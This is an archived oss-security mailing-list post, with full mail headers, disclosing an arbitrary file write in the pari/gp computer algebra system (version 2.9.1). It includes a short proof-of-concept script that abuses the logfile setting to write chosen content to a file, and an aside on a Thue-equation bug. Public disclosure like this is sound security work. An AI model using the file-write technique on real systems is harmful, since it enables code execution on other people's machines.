X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["693" "Monday" "1" "July" "2019" "10:32:17" "+0300" "Georgi Guninski" "gguninski@gmail.com" "<CAGUWgD8TFq0E0yDf9sDMqLny755_Bh+19Q9ynA2RT9+Lidsxsg@mail.gmail.com>" "26" "[oss-security] pari/gp arbitrary file write" nil nil nil "7" "2019070107:32:17" "[oss-security] pari/gp arbitrary file write" (number mark "U       gguninski@gm Jul  1   26/693   " thread-indent "\"[oss-security] pari/gp arbitrary file write\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] pari/gp arbitrary file write" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1501 invoked by uid 550); 1 Jul 2019 11:26:59 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28332 invoked from network); 1 Jul 2019 07:32:41 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=hTaXWAX4Y36nx/zUQfvYHs3WSfe6bI6PL8zk+ET3FqA=;
        b=m9bi1nZCeYBNdZUGpcAaXE18oAuiayRrw+BoiyZ0T8edX5kHDp+hgFQ/ZxTup068tP
         /N98QRUVLM4RPpEMxnUtmgKGzWp3ZlGIEmyAxxE3LZSCX8HwKS1VMSlCKbQ7GVYZeGC1
         CusD62maB4pCh7aWLJbxmL5iXYf+qBFaz+SyDJBJ3X7w3LGjMVYrPNlSRec/1tGHUQpm
         Cor82JMxz38fNcATFQe2L3mh5Lll88HBSfG1opAm80ZFMVpQmlQcwDsc7ehpt5vvLbNe
         vN3L9aEzOwm4qNX4QWwSAEiPPdNvaGXIpQdIx8ojvwmhWWzczpDNq07ljn5VAqmBdK19
         DacQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=hTaXWAX4Y36nx/zUQfvYHs3WSfe6bI6PL8zk+ET3FqA=;
        b=eb+fe1pUf2QfX6CiWPsb8XP9KEFMTGxXd08cDAeSHTGVmBKk0aIfi8BqaBnLr0/mOq
         AuaRiErCAn9fBeztb/ni2pWga7TYvez1kmu9U1anrxM5E+K8UhIs+Ck37gZlUrSPTYBq
         iIJZikdntEurScApMBGVBz3cjaIdYT3zn5eD+U2vHPIlxsh/Wa1dTNNu0zAQjyAP2WOD
         hzjG6h4VjlZLE3VY04LAlK+SE1c/KMUPSRsgjPAD2TdRmKLL2PPFEZCbg4zk9+hY7ztP
         IxF0+xqf860i6wgz2/1C7gJVxCthTcDV6fd0q1KtMwgvlChKVi2A+dcBLjHgFfeUxIfI
         EDgQ==
X-Gm-Message-State: APjAAAUXpy3+v28Ey9ocPEdVEDHnf4TpiOr/NXvpX3uC/ZRlCG66U9LI
	q4Si9PjvJcNjecU6VnnSP3f5da03lCYthn70ASGpg6JX
X-Google-Smtp-Source: APXvYqwDw6z4Yi2hiwHXjN4Ds5QbZYs13bNp5518Z0IKUOwxe73kRtJL6uuX1Ki+Ye9bAz9XS7Z7lphdJwFkq1PB4FU=
X-Received: by 2002:a6b:1494:: with SMTP id 142mr4667504iou.72.1561966348869;
 Mon, 01 Jul 2019 00:32:28 -0700 (PDT)
MIME-Version: 1.0
From: Georgi Guninski <gguninski@gmail.com>
Date: Mon, 1 Jul 2019 10:32:17 +0300
Message-ID: <CAGUWgD8TFq0E0yDf9sDMqLny755_Bh+19Q9ynA2RT9+Lidsxsg@mail.gmail.com>
To: oss-security <oss-security@lists.openwall.com>
Content-Type: multipart/alternative; boundary="000000000000602642058c99a1ff"
Subject: [oss-security] pari/gp arbitrary file write

--000000000000602642058c99a1ff
Content-Type: text/plain; charset="UTF-8"

pari/gp is CAS (computer algebra system).
pari/gp version 2.9.1 on debian stretch allows arbitrary file write and
hence arbitrary code execution.

poc:
========
\\ a.gp
\\ to run: \r a.gp
default("logfile","/tmp/a.txt");default("log",1);print("log(1)");
========

Of mathematical interest is pari was missing solutions
to Thue equations when assuming GRH (the fix changed polynomial
bound to exponential bound):
http://pari.math.u-bordeaux.fr/archives/pari-dev-1207/msg00000.html
t=thue(thueinit(x^3+92*x+1,0),3^3);t

-- 
joro
http://www.guninski.com
https://j.ludost.net/resumegg.pdf

--000000000000602642058c99a1ff--
